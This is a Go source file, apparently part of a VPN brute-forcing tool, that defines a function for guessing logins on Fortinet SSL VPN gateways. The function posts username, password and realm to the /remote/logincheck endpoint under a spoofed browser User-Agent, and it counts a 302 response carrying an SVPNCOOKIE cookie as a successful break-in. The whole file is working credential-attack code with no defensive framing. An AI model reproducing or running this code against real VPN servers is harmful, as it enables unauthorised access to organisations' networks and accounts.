// vpn/brute/fortinet.go
package main

import (
	"strings"

	"github.com/valyala/fasthttp"
)

func BruteFortinet(client *fasthttp.Client, target, login, password, realm string) bool {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	// 1. POST /remote/logincheck
	req.SetRequestURI(target + "/remote/logincheck")
	req.Header.SetMethod("POST")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

	data := "username=" + login + "&password=" + password
	if realm != "" {
		data += "&realm=" + realm
	}
	req.SetBodyString(data)

	if err := client.Do(req, resp); err != nil {
		return false
	}

	// Успех = 302 + Set-Cookie: SVPNCOOKIE
	return resp.StatusCode() == 302 &&
		strings.Contains(resp.Header.String(), "SVPNCOOKIE")
}